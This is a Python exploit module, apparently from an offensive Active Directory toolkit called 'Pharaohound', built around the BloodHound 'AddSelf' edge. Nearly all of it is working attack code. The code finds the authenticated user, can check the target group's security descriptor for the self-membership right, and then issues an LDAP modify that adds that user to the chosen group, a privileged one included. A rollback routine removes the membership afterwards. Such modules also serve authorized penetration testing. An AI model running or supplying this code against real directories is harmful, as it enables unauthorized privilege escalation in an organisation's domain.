"""
Module: AddSelf
===============
Exploit the AddSelf BloodHound edge. When a principal holds the
self-membership right (ADS_RIGHT_DS_SELF_MEMBERSHIP) on a group,
this module adds the currently authenticated user to that group.

This is a narrower, more targeted variant of AddMembers — it
specifically exercises the "add self" permission, which is common
in AD environments where users are granted self-enrollment into
certain groups.

BloodHound Edge: AddSelf
Attack Vector:   Self-membership enrollment into privileged group
Severity:        HIGH
"""

import logging
from typing import Any, Dict, List, Optional, Tuple

import ldap3

from .base import (
    ExploitModule, ExploitOutput, ExploitResult,
    ModuleOption, Severity,
)

logger = logging.getLogger("pharaohound.modules.add_self")


class AddSelf(ExploitModule):
    """
    Add the currently authenticated principal to a target group when
    the current user holds the ADS_RIGHT_DS_SELF_MEMBERSHIP right
    (0x00000001) on that group object.

    The key difference from AddMembers:
      - AddMembers  → add ANY principal to the group.
      - AddSelf     → add ONLY the authenticated principal (self).
    """

    name: str            = "AddSelf"
    description: str     = (
        "Add the current authenticated user to a target group using the "
        "self-membership right (ADS_RIGHT_DS_SELF_MEMBERSHIP). This right "
        "allows a principal to add itself to a group without needing "
        "full AddMembers permission."
    )
    author: str          = "Pharaohound"
    edge_type: str       = "AddSelf"
    severity: Severity   = Severity.HIGH
    references: List[str] = [
        "https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#addself",
        "https://attack.mappings.mitre.org/technique/T1098/003/",
        "https://learn.microsoft.com/en-us/windows/win32/adschema/a-selfmembership",
    ]
    tools_required: List[str] = []
    needs_da: bool        = False
    needs_privileged: bool = False

    def _register_options(self):
        self._add_option(ModuleOption(
            name="target_group",
            display_name="Target Group",
            description="DN or SAM name of the group to add self to.",
            required=True,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="domain",
            display_name="Domain",
            description="FQDN of the target domain.",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="verify_right",
            display_name="Verify Self-Membership Right",
            description="Read the group SD to confirm ADS_RIGHT_DS_SELF_MEMBERSHIP before acting.",
            required=False,
            default=True,
            value_type=bool,
        ))

    # ------------------------------------------------------------------ #
    # Helpers
    # ------------------------------------------------------------------ #

    def _resolve_dn(self, name: str, search_base: str) -> Optional[str]:
        if not name:
            return None
        if "," in name and "=" in name:
            return name
        search_filter = f"(|(sAMAccountName={name})(cn={name}))"
        try:
            self.connection.search(
                search_base, search_filter, attributes=["distinguishedName"]
            )
            if self.connection.entries:
                return str(self.connection.entries[0].distinguishedName)
        except Exception as exc:
            self.logger.error("DN resolution failed for '%s': %s", name, exc)
        return None

    def _get_search_base(self, domain: Optional[str]) -> str:
        if domain:
            return ",".join(f"DC={p}" for p in domain.split("."))
        conn = self.connection
        if hasattr(conn, "server") and hasattr(conn.server, "info"):
            info = conn.server.info
            if info and info.other.get("defaultNamingContext"):
                return info.other["defaultNamingContext"][0]
        return ""

    def _get_bound_user_dn(self) -> Optional[str]:
        conn = self.connection
        try:
            if hasattr(conn, "extend") and hasattr(conn.extend, "standard"):
                return conn.extend.standard.who_am_i()
            elif hasattr(conn, "who_am_i"):
                return conn.who_am_i()
        except Exception as exc:
            self.logger.debug("who_am_i failed: %s", exc)
        return None

    def _verify_self_membership_right(self, group_dn: str) -> Tuple[bool, str]:
        """
        Read the group's security descriptor and look for
        ADS_RIGHT_DS_SELF_MEMBERSHIP (0x01) granted to the current user
        or to a group the user belongs to.
        """
        try:
            self.connection.search(
                group_dn,
                "(objectClass=*)",
                attributes=["nTSecurityDescriptor"],
                controls=[("1.2.840.113556.1.4.801", True, None)],
            )
            if not self.connection.entries:
                return False, "Group not found."

            sd_raw = self.connection.entries[0].nTSecurityDescriptor.raw_values
            if not sd_raw:
                return True, "No SD returned; skipping verification."

            from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
            sd = SR_SECURITY_DESCRIPTOR(data=sd_raw[0])

            SELF_MEMBERSHIP = 0x01  # ADS_RIGHT_DS_SELF_MEMBERSHIP

            if sd['Dacl'] != b'':
                for ace in sd['Dacl'].aces:
                    if ace['TypeName'] in ("ACCESS_ALLOWED_ACE", "ACCESS_ALLOWED_OBJECT_ACE"):
                        mask = ace['Ace']['Mask']['Mask']
                        if mask & SELF_MEMBERSHIP:
                            trustee = ace['Ace']['Sid'].formatCanonical() if 'Sid' in ace['Ace'].fields else "Unknown"
                            return True, (
                                f"Self-membership right confirmed (trustee: {trustee})."
                            )

            return False, (
                "ADS_RIGHT_DS_SELF_MEMBERSHIP not found in the group's DACL. "
                "Server will likely reject the operation."
            )
        except ImportError:
            return True, "SD parser unavailable; skipping verification."
        except Exception as exc:
            return True, f"Verification inconclusive: {exc}"

    # ------------------------------------------------------------------ #
    # Prerequisites
    # ------------------------------------------------------------------ #

    def check_prerequisites(self, **kwargs) -> Tuple[bool, str]:
        if self.connection is None:
            return False, "No LDAP connection provided."

        target_group = self._opt("target_group", kwargs)
        if not target_group:
            return False, "Target group is required."

        domain = self._opt("domain", kwargs)
        search_base = self._get_search_base(domain)
        if not search_base:
            return False, "Cannot determine search base."

        group_dn = self._resolve_dn(target_group, search_base)
        if not group_dn:
            return False, f"Target group '{target_group}' not found."

        return True, ""

    # ------------------------------------------------------------------ #
    # Exploit
    # ------------------------------------------------------------------ #

    def exploit(self, **kwargs) -> ExploitOutput:
        conn = self.connection
        target_group = self._opt("target_group", kwargs)
        domain = self._opt("domain", kwargs)
        verify = self._opt("verify_right", kwargs)

        search_base = self._get_search_base(domain)

        # Resolve group
        group_dn = self._resolve_dn(target_group, search_base)
        if not group_dn:
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Cannot resolve target group '{target_group}'.",
            )

        # Get current user DN
        self_dn = self._get_bound_user_dn()
        if not self_dn:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message="Cannot determine DN of the currently authenticated user.",
            )

        self.logger.info("[AddSelf] Adding self '%s' -> '%s'", self_dn, group_dn)

        # Optional right verification
        if verify:
            ok, msg = self._verify_self_membership_right(group_dn)
            self.logger.info("[AddSelf] Right check: %s", msg)
            if not ok:
                return ExploitOutput(
                    success=False, result_type=ExploitResult.FAILED,
                    message=f"Self-membership right not found: {msg}",
                )

        # Check if already a member
        try:
            conn.search(group_dn, "(objectClass=*)", attributes=["member"])
            if conn.entries and hasattr(conn.entries[0], "member"):
                existing = conn.entries[0].member.values or []
                if self_dn in existing:
                    return ExploitOutput(
                        success=True, result_type=ExploitResult.SKIPPED,
                        message=f"Already a member of '{group_dn}'.",
                        data={"group_dn": group_dn, "self_dn": self_dn},
                    )
        except Exception:
            pass

        # Perform LDAP modify
        try:
            result = conn.modify(
                group_dn,
                {"member": [(ldap3.MODIFY_ADD, [self_dn])]},
            )
            if result:
                self.logger.info("[AddSelf] SUCCESS — self added to group.")
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=f"Successfully added self ('{self_dn}') to '{group_dn}'.",
                    data={
                        "group_dn": group_dn,
                        "self_dn": self_dn,
                        "action": "self_added",
                    },
                    rollback_data={
                        "group_dn": group_dn,
                        "principal_dn": self_dn,
                        "operation": "remove_member",
                    },
                )
            else:
                err = conn.result.get("description", "Unknown error")
                return ExploitOutput(
                    success=False, result_type=ExploitResult.FAILED,
                    message=f"LDAP modify failed: {err}",
                    data={"ldap_result": conn.result},
                )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Exception during AddSelf: {exc}",
            )

    # ------------------------------------------------------------------ #
    # Rollback
    # ------------------------------------------------------------------ #

    def rollback(self, **kwargs) -> ExploitOutput:
        group_dn = kwargs.get("group_dn")
        principal_dn = kwargs.get("principal_dn")
        if not group_dn or not principal_dn:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message="Rollback needs 'group_dn' and 'principal_dn'.",
            )
        try:
            result = self.connection.modify(
                group_dn,
                {"member": [(ldap3.MODIFY_DELETE, [principal_dn])]},
            )
            if result:
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=f"Rolled back: removed self from '{group_dn}'.",
                )
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Rollback failed: {self.connection.result.get('description', '')}",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Rollback exception: {exc}",
            )
